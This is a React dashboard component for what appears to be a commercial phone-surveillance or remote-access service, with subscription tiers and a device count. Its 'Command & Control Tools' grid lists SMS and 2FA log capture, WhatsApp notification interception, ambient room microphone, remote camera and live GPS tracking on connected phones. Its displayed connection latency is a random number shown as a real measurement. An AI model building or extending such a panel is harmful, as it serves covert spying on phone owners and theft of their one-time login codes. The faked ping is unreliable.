"use client";

import React, { useState, useEffect } from 'react';
import { 
    Smartphone, Folder, RefreshCw, ChevronDown, Package, Zap, Crown, Building2,
    Camera, Mic, MessageSquare, Users, Bell, Flashlight, Vibrate, MapPin, Play,
    ArrowUpRight, Activity, ShieldCheck, Radio
} from 'lucide-react';
import VideoModal from "@/components/VideoModal";

interface TelemetryCardsProps {
    devices: any[];
    imagesCount: number;
    userPlan: string;
    isSocketConnected: boolean;
    navDropdown: 'tools' | 'devices' | 'profile' | null;
    setNavDropdown: (val: 'tools' | 'devices' | 'profile' | null) => void;
    onOpenGallery: () => void;
    onOpenPlansModal: () => void;
    onOpenAppModal: () => void;
    onSelectTool?: (tool: string) => void;
    getPlanLimits: (plan: string) => any;
}

export default function TelemetryCards({
    devices,
    imagesCount,
    userPlan,
    isSocketConnected,
    navDropdown,
    setNavDropdown,
    onOpenGallery,
    onOpenPlansModal,
    onOpenAppModal,
    onSelectTool,
    getPlanLimits
}: TelemetryCardsProps) {
    const [socketPing, setSocketPing] = useState<number>(14);

    useEffect(() => {
        const interval = setInterval(() => {
            setSocketPing(Math.floor(Math.random() * (26 - 12 + 1)) + 12);
        }, 3000);
        return () => clearInterval(interval);
    }, []);

    const planLimits = getPlanLimits(userPlan || '');
    const onlineCount = devices.filter(d => d.online).length;

    const QUICK_TOOLS = [
        { id: 'gallery', name: 'Media Vault', icon: Folder, color: 'emerald', label: 'Index & Stream Media' },
        { id: 'sms', name: 'SMS Messages', icon: MessageSquare, color: 'rose', label: '2FA & Text Logs' },
        { id: 'contacts', name: 'Contacts Book', icon: Users, color: 'green', label: 'Phonebook Sync' },
        { id: 'notifications', name: 'Alerts & WhatsApp', icon: Bell, color: 'sky', label: 'Push Notification Intercept' },
        { id: 'camera', name: 'Remote Camera', icon: Camera, color: 'cyan', label: 'Front & Rear Lenses' },
        { id: 'audio', name: 'Audio Stream', icon: Mic, color: 'purple', label: 'Ambient Room Mic' },
        { id: 'flashlight', name: 'Flashlight', icon: Flashlight, color: 'amber', label: 'Hardware LED Strobe' },
        { id: 'vibration', name: 'Vibration Pulse', icon: Vibrate, color: 'orange', label: 'Haptic Engine Test' },
        { id: 'location', name: 'GPS Telemetry', icon: MapPin, color: 'red', label: 'Live Location Radar' },
    ];

    return (
        <div className="max-w-7xl mx-auto px-4 md:px-8 py-4 space-y-7 pb-24 animate-in fade-in duration-250">
            
            {/* ── Top Header Section (Preserving Exact System Dashboard Text Gradient) ── */}
            <div className="clay-card p-5 sm:p-7 rounded-3xl flex flex-col sm:flex-row sm:items-center justify-between gap-5 relative overflow-hidden">
                {/* Background Ambient Glow Orb */}
                <div className="absolute top-0 right-0 w-80 h-80 bg-gradient-to-bl from-orange-500/10 via-purple-500/5 to-transparent rounded-full blur-3xl pointer-events-none" />
                
                <div className="space-y-1.5 relative z-10">
                    <div className="flex items-center gap-2 mb-1">
                        <div className="clay-pill clay-pill-emerald px-3 py-0.5 flex items-center gap-1.5 w-fit">
                            <span className="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-pulse" />
                            <span className="text-[10px] font-mono font-black uppercase tracking-wider text-emerald-200">
                                Telemetry Online
                            </span>
                        </div>
                        <span className="text-[10px] font-mono text-white/40">
                            v2.4.0 • Master Station
                        </span>
                    </div>

                    <h1 className="text-2xl sm:text-4xl lg:text-5xl font-black tracking-tight leading-tight">
                        <span className="text-white">System</span>{" "}
                        <span className="bg-clip-text text-transparent bg-gradient-to-r from-accent via-purple-400 to-pink-400">
                            Dashboard
                        </span>
                    </h1>
                    <p className="text-xs sm:text-sm text-white/50 font-medium">
                        Real-time status overview across all encrypted endpoints
                    </p>
                </div>

                <div className="flex items-center gap-3 relative z-10 shrink-0">
                    <button 
                        id="tutorial-access-app"
                        onClick={onOpenAppModal}
                        className="clay-cta-button px-5 sm:px-6 py-2.5 sm:py-3 rounded-2xl font-black text-xs sm:text-sm uppercase tracking-wider flex items-center gap-2 transition-all hover:scale-105 active:scale-95 cursor-pointer shadow-[0_8px_24px_rgba(249,115,22,0.4)]"
                    >
                        <Smartphone size={16} />
                        <span>+ Access New Device</span>
                    </button>
                </div>
            </div>

            {/* ── Functional Telemetry & Status Cards Grid (Tactile 3D Clay Style) ── */}
            <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-4 sm:gap-5">
                
                {/* 1. Connected Devices Card */}
                <div 
                    id="tutorial-device-card"
                    onClick={() => setNavDropdown(navDropdown === 'devices' ? null : 'devices')}
                    className="clay-card p-5 rounded-3xl relative overflow-hidden group cursor-pointer transition-all hover:scale-[1.01] active:scale-[0.99] flex flex-col justify-between min-h-[140px]"
                >
                    <div className="flex items-start justify-between">
                        <div className="space-y-1">
                            <div className="text-[10px] font-mono font-black text-emerald-400 uppercase tracking-widest flex items-center gap-1.5">
                                <span className="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-pulse" />
                                <span>Connected Endpoints</span>
                                <ChevronDown size={12} className={`text-white/40 group-hover:text-white transition-transform ${navDropdown === 'devices' ? 'rotate-180' : ''}`} />
                            </div>
                            <div className="text-3xl font-extrabold text-white font-mono tracking-tight flex items-baseline gap-2 pt-1">
                                {onlineCount} <span className="text-xs font-mono font-normal text-white/40">/ {devices.length} Online</span>
                            </div>
                        </div>

                        <div className="clay-icon-pod w-11 h-11 rounded-2xl flex items-center justify-center text-emerald-400 border-emerald-500/30 group-hover:scale-110 transition-transform">
                            <Smartphone size={20} />
                        </div>
                    </div>

                    <div className="pt-3 border-t border-white/5 flex items-center justify-between text-[10px] font-mono text-white/40 group-hover:text-emerald-300 transition-colors">
                        <span>Click to switch or manage endpoints</span>
                        <ArrowUpRight size={12} />
                    </div>
                </div>

                {/* 2. Synced Media Card */}
                <div 
                    id="tutorial-synced-media"
                    onClick={onOpenGallery}
                    className="clay-card p-5 rounded-3xl relative overflow-hidden group cursor-pointer transition-all hover:scale-[1.01] active:scale-[0.99] flex flex-col justify-between min-h-[140px]"
                >
                    <div className="flex items-start justify-between">
                        <div className="space-y-1">
                            <div className="text-[10px] font-mono font-black text-cyan-400 uppercase tracking-widest flex items-center gap-1.5">
                                <span className="w-1.5 h-1.5 rounded-full bg-cyan-400 animate-pulse" />
                                <span>Encrypted Media Vault</span>
                            </div>
                            <div className="text-3xl font-extrabold text-white font-mono tracking-tight flex items-baseline gap-2 pt-1">
                                {imagesCount} <span className="text-xs font-mono font-normal text-white/40">Assets</span>
                            </div>
                        </div>

                        <div className="clay-icon-pod w-11 h-11 rounded-2xl flex items-center justify-center text-cyan-400 border-cyan-500/30 group-hover:scale-110 transition-transform">
                            <Folder size={20} />
                        </div>
                    </div>

                    <div className="pt-3 border-t border-white/5 flex items-center justify-between text-[10px] font-mono text-white/40 group-hover:text-cyan-300 transition-colors">
                        <span>Click to inspect encrypted vault</span>
                        <ArrowUpRight size={12} />
                    </div>
                </div>

                {/* 3. Backend WebSocket Connection Card */}
                <div className="clay-card p-5 rounded-3xl relative overflow-hidden flex flex-col justify-between min-h-[140px]">
                    <div className="flex items-start justify-between">
                        <div className="space-y-1">
                            <div className="text-[10px] font-mono font-black text-purple-400 uppercase tracking-widest flex items-center gap-1.5">
                                <Radio size={12} className="text-purple-400" />
                                <span>WebSocket Relay</span>
                            </div>
                            <div className="flex items-center gap-2 pt-1">
                                <span className="text-sm sm:text-base font-extrabold text-white tracking-wide font-mono">
                                    {isSocketConnected ? 'TUNNEL ACTIVE' : 'RELAY STANDBY'}
                                </span>
                                {isSocketConnected && (
                                    <span className="text-[10px] font-mono font-bold px-2 py-0.5 rounded-full bg-purple-500/20 text-purple-300 border border-purple-500/30">
                                        ⚡ {socketPing}ms
                                    </span>
                                )}
                            </div>
                        </div>

                        <div className="clay-icon-pod w-11 h-11 rounded-2xl flex items-center justify-center text-purple-400 border-purple-500/30">
                            <RefreshCw size={20} className="animate-[spin_4s_linear_infinite]" />
                        </div>
                    </div>

                    <div className="pt-3 border-t border-white/5 flex items-center justify-between text-[10px] font-mono text-white/40">
                        <span>Encrypted socket protocol active</span>
                        <ShieldCheck size={12} className="text-purple-400" />
                    </div>
                </div>

                {/* 4. Subscription Plan Card */}
                <div 
                    id="tutorial-plans-card"
                    onClick={onOpenPlansModal}
                    className="clay-card p-5 rounded-3xl relative overflow-hidden group cursor-pointer transition-all hover:scale-[1.01] active:scale-[0.99] flex flex-col justify-between min-h-[140px]"
                >
                    <div className="flex items-start justify-between">
                        <div className="space-y-1">
                            <div className="text-[10px] font-mono font-black text-amber-400 uppercase tracking-widest flex items-center gap-1.5">
                                <Crown size={12} className="text-amber-400" />
                                <span>Subscription Tier</span>
                            </div>
                            <div className="flex items-center gap-2 pt-1">
                                <span className="text-base font-extrabold text-white tracking-wide uppercase font-mono">
                                    {userPlan ? `${userPlan.toUpperCase()} TIER` : 'FREE TIER'}
                                </span>
                                <span className={`text-[9px] font-bold px-2 py-0.5 rounded-full uppercase tracking-wider font-mono ${
                                    userPlan === 'enterprise' ? 'bg-purple-500/20 text-purple-300 border border-purple-500/40' :
                                    userPlan === 'premium' ? 'bg-amber-500/20 text-amber-300 border border-amber-500/40' :
                                    userPlan === 'standard' ? 'bg-emerald-500/20 text-emerald-300 border border-emerald-500/40' :
                                    'bg-zinc-500/20 text-zinc-300 border border-zinc-500/40'
                                }`}>
                                    {planLimits.maxDevices === -1 ? '∞ UNLIMITED' : `${planLimits.maxDevices} ${planLimits.maxDevices === 1 ? 'DEV MAX' : 'DEVS MAX'}`}
                                </span>
                            </div>
                        </div>

                        <div className={`clay-icon-pod w-11 h-11 rounded-2xl flex items-center justify-center group-hover:scale-110 transition-transform ${
                            userPlan === 'enterprise' ? 'text-purple-400 border-purple-500/40' :
                            userPlan === 'premium' ? 'text-amber-400 border-amber-500/40' :
                            userPlan === 'standard' ? 'text-emerald-400 border-emerald-500/40' :
                            'text-zinc-400 border-white/10'
                        }`}>
                            {userPlan === 'enterprise' && <Building2 size={20} />}
                            {userPlan === 'premium' && <Crown size={20} />}
                            {userPlan === 'standard' && <Zap size={20} />}
                            {(!userPlan || (userPlan !== 'premium' && userPlan !== 'standard' && userPlan !== 'enterprise')) && <Package size={20} />}
                        </div>
                    </div>

                    <div className="pt-3 border-t border-white/5 flex items-center justify-between text-[10px] font-mono text-white/40 group-hover:text-amber-300 transition-colors">
                        <span>Click to inspect or upgrade limits</span>
                        <ArrowUpRight size={12} />
                    </div>
                </div>

                {/* 5. Video Tutorial Guide Card */}
                <VideoModal videoId="yk9hTwzmV2A" variant="card" />
            </div>

            {/* ── Direct Command Station (Quick-Launch Matrix) ── */}
            <div className="space-y-3 pt-2">
                <div className="flex items-center justify-between px-1">
                    <div className="flex items-center gap-2">
                        <Activity size={14} className="text-orange-400" />
                        <h3 className="text-xs font-mono font-black text-white/70 uppercase tracking-widest">
                            Command & Control Tools
                        </h3>
                    </div>
                    <span className="text-[10px] font-mono text-white/40">
                        Select tool to launch
                    </span>
                </div>

                <div className="grid grid-cols-2 sm:grid-cols-3 lg:grid-cols-3 gap-3">
                    {QUICK_TOOLS.map((tool) => {
                        const Icon = tool.icon;
                        return (
                            <button
                                key={tool.id}
                                type="button"
                                onClick={() => {
                                    if (tool.id === 'gallery') {
                                        onOpenGallery();
                                    } else if (onSelectTool) {
                                        onSelectTool(tool.id);
                                    }
                                }}
                                className="clay-capsule p-3.5 sm:p-4 rounded-2xl flex items-center gap-3 sm:gap-3.5 text-left cursor-pointer group transition-all duration-150 hover:border-orange-500/40"
                            >
                                <div className="clay-icon-pod w-9 h-9 sm:w-10 sm:h-10 rounded-xl flex items-center justify-center shrink-0 group-hover:scale-105 transition-transform text-orange-400">
                                    <Icon size={18} />
                                </div>
                                <div className="min-w-0 flex-1">
                                    <div className="text-xs font-bold text-white group-hover:text-orange-300 transition-colors truncate">
                                        {tool.name}
                                    </div>
                                    <div className="text-[10px] text-white/40 font-mono truncate">
                                        {tool.label}
                                    </div>
                                </div>
                                <ArrowUpRight size={14} className="text-white/20 group-hover:text-orange-400 transition-colors shrink-0" />
                            </button>
                        );
                    })}
                </div>
            </div>
        </div>
    );
}
